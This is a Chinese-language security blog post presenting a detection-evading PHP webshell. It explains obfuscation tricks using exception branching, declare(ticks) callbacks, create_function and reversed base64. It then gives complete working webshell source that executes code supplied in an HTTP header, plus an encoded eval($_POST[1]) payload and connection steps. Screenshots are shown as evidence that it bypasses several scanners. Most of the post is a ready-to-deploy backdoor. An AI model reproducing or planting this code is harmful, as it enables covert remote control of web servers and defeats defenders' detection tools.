---
title: 记录一个免杀的PHP Webshell Demo
url: https://mp.weixin.qq.com/s/A33HO5zed0MyAfqxWrq9QA
source: Doonsec's feed
date: 2026-11-27
fetch_date: 2026-11-28T09:40:32.162439
---

# 记录一个免杀的PHP Webshell Demo

# 记录一个免杀的PHP Webshell Demo

蚁景网安

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

以下文章来源于蚁景网络安全
，作者Luc1dkilL

![](https://wx.qlogo.cn/mmhead/Q3auHgzwzM7Yk0SeU4ibQcLl1mDLlqhbAOdK1Ik3EO85soOvkh9e8wQ/0)

**蚁景网络安全**
.

致力于为你带来更实用的网络安全技术内容！

## 分支对抗

分支对抗简单来说就是利用了增大程序控制分支的复杂度来使得绕过检测引擎，程序在控制流图上往往有几种结构：

![](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkiap8PNtBctIvgzMDxeIWeA4ZxRtLibmNcBiaNMiaK5K9kJ25EJ9ZGLVuE8zGo9ibnPOaialFqP5ia7mv3iaondUx6scIeTuP1uRLV70I8/640?wx_fmt=png&from=appmsg)

那么我们还有其他的改变程序控制流的思路不？此处我用了两种方法混合在一起实现免杀

### 异常捕获机制

这里使用的是触发异常来完成程序控制流的第一次分支，所以我自己写了一个除以0触发异常的函数

```
function safeDivide(a,b) {
    if ($b == 0) {
        throw new Exception("Division by zero is not allowed.");
    }
    return a/b;
}
```

设置一个pass传参，我设置的主体框架如下：

```
try {
    echo "result:".safeDivide(2025, ($_GET['pass']-1));
}catch(Exception $e){
    // evil code
}
```

### 回调

我在php的官方文档里翻到一个有趣的函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkgugPHALya9lRDibVWFnHDovyu0MlbOqfVURvYEibziajr2fibgXrCV4KME4m2fkLtbPdejBu4wYGQtA6fvz5OQy87Cvx4lW0IgHFI/640?wx_fmt=png&from=appmsg)

ticks参数可以设置Zend VM opcode执行条数后触发

我们测试一下：

```
<?php
declare(ticks=15);

function test(){
    echo "this is evil code\n";
}
register_tick_function('test');
for ($i = 1; $i <= 12; $i++) {
    echo "shell: $i\n";
}
```

我们可以发现设置declare(ticks=15) 后，PHP每累计到约15个“tickable”执行点，就调用一次通过register\_tick\_function注册的函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkg7dkMjbvhmJQCpAfPk5oxNuLJ316pxHnsrslI7HvUh97jiaw8eWyn8ib7gqY1EWluHBNmS7OHQom0TID6CEajOYkSjYpZ2B9b3g/640?wx_fmt=png&from=appmsg)

那么对于我们的webshell免杀，我们也可以利用这个函数，来完成程序控制流的改变

此处的设计将declare回调放在最外层实现第一次的控制流变化，将异常触发放在内层实现第二次

## 动态函数调用

这个就是直接使用php的函数了，没啥好说的了

```
create_function(string $args, string $code): string
```

实际测试的时候，如果使用变量接受的话，容易被检测

```
$a = create_function('', '');
$a();
```

不使用变量来存匿名函数，这个也是尽量减少污点分析时候的特征

```
@create_function('','')))();
```

## 编码混淆

找个大模型一把梭

base64和逆序

```
function custom_base64_decode($input) {
    $base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    $input = rtrim($input, '=');
    $binaryString = '';
    foreach (str_split($input) as $char) {
        $index = strpos($base64Chars, $char);
        if ($index === false) {
            throw new Exception("Invalid Base64 character: $char");
        }
    $binaryString .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
}

    $bytes = str_split($binaryString, 8);
    $decodedString = '';

    foreach ($bytes as $byte) {
        $decodedString .= chr(bindec($byte));
    }
    return $decodedString;
}

function reverseString($input)
{
    if (!is_string($input)) {
        return "need str";
    }
    $length = strlen($input);
    $reversed = "";
    for ($i = $length - 1; $i >= 0; $i--) {
        $reversed .= $input[ $i ];
    }
    return $reversed;
}
```

## 完整的webshell

### 源代码

具体的攻击载荷放在http的X-Csrf-Token里

```
<?php
session_start();
declare(ticks=15);
function safeDivide($a, $b) {
    if ($b == 0) {
        throw new Exception("Division by zero is not allowed.");
    }
    return $a / $b;
}
function custom_base64_decode($input) {
    $base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    $input = rtrim($input, '=');
    $binaryString = '';
    foreach (str_split($input) as $char) {
        $index = strpos($base64Chars, $char);
        if ($index === false) {
            throw new Exception("Invalid Base64 character: $char");
        }
    $binaryString .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
}

    $bytes = str_split($binaryString, 8);
    $decodedString = '';

    foreach ($bytes as $byte) {
        $decodedString .= chr(bindec($byte));
    }
    return $decodedString;
}

function reverseString($input)
{
    if (!is_string($input)) {
        return "need str";
    }
    $length = strlen($input);
    $reversed = "";
    for ($i = $length - 1; $i >= 0; $i--) {
        $reversed .= $input[ $i ];
    }
    return $reversed;
}

function tickHandler(){
    try {
        echo "result:".safeDivide(2025, ($_GET['pass']-1));
    }catch(Exception $e){
        @create_function('',custom_base64_decode(reverseString(apache_request_headers()['X-Csrf-Token'])))();
    }
}

register_tick_function('tickHandler');

for ($i = 1; $i <= 12; $i++) {
    echo "shell: $i\n";
}
```

### 测试环境

PHP版本：PHP7全版本

OS：Windows和Linux环境均测试通过

### 使用方法

初始payload： `eval($_POST[1]);`

base64编码，逆序处理：`==wOp0VMbR1UPB1XkgCbhZXZ`

放在http头部里

![](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkhib9fWulhEvzhPk03GaFrsib7vYDtC0h1PQ2F2OqlaoIpfEEL4f3DyUVUu3dbItcia2qMzgaWPtEib4ZgliahUy94BlcgOyPLvGMeg/640?wx_fmt=png&from=appmsg)

webshell连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkglgrgmg3rQBQiadCicx7Tic6KbKMMy9275mH83zqCqsHdrpv9gwgF6lYUOmvVCUcDFdbOAL5KPFEnBAAxAWckXvU3yoU10RhIY5Q/640?wx_fmt=png&from=appmsg)

## 免杀效果展示

* 第四届伏魔挑战赛成功绕过（white）的截图

![](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkjtIgd6vbtPt2icsX0bic6lLHNwlyj8ODsvqVth5ic61qw7ia7GmsL9qnK26Mo4nN4yPaXfibzqv7RIRdlS3vALcPkT85dVaw0srPkM/640?wx_fmt=png&from=appmsg)

* VT

![](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkjC84BLtTJlFIdjTAepeIR6XvKPERvNJKbPOdiamCKEvCaDr6YuK3KbS5rrCTDibduYcfPdCQicn43gFWABvamVM74uWH41KEvfIo/640?wx_fmt=png&from=appmsg)

* D盾(2.1.8.6)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkgdCeQZe2zzn0VAPhYPjhlOIQkP1GUM3vHPmpnOcNkNZhYyFpwWnJDMsSbkgDbtqlH1cHVTPPyN07kt5ksBaHiah0ejgAwHNzDY/640?wx_fmt=png&from=appmsg)

* 河马：报了可疑

![](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkg31wMKnVibsk5TQwl2tXF15yPia9gicam8cmcHs8Z97Pm2gvEOCNWqHJicKYDsrnYUxCA3ZjNyyNS2rrttxAEAnOzrGaYga4ibOhDA/640?wx_fmt=png&from=appmsg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10)

学习网安实战技术，戳“阅读原文”

预览时标签不可点

阅读原文

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过